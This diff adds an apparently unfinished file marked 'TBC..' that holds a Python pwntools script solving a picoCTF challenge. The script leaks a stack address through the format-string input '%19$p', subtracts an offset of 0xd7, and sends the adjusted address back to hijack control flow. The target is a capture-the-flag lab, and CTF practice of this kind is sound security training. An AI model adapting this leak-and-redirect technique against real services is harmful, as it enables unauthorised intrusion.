@@ -1,0 +1,31 @@
+TBC..
+
+
+#!/usr/bin/env python3
+from pwn import *
+
+
+r = remote('rescued-float.picoctf.net', 60909)
+
+# Wait for the initial prompt.
+r.recvuntil(b"Enter your name:")
+# Send format string.
+r.sendline(b"%19$p")
+
+# Wait for the prompt again.
+leak_output = r.recvuntil(b"12345:")
+
+#extract address from first line of output
+leaked_address = leak_output.split(b'\n')[0].strip()
+log.info("Leaked address: " + leaked_address.decode())
+
+#subtract 0xd7
+leaked_int = int(leaked_address.decode(), 16)
+adjusted_int = leaked_int - 0xd7
+payload = hex(adjusted_int).encode()
+
+log.info("Payload: " + payload.decode())
+r.sendline(payload)
+output = r.recvall(timeout=2)
+print(output.decode())
+#r.interactive()
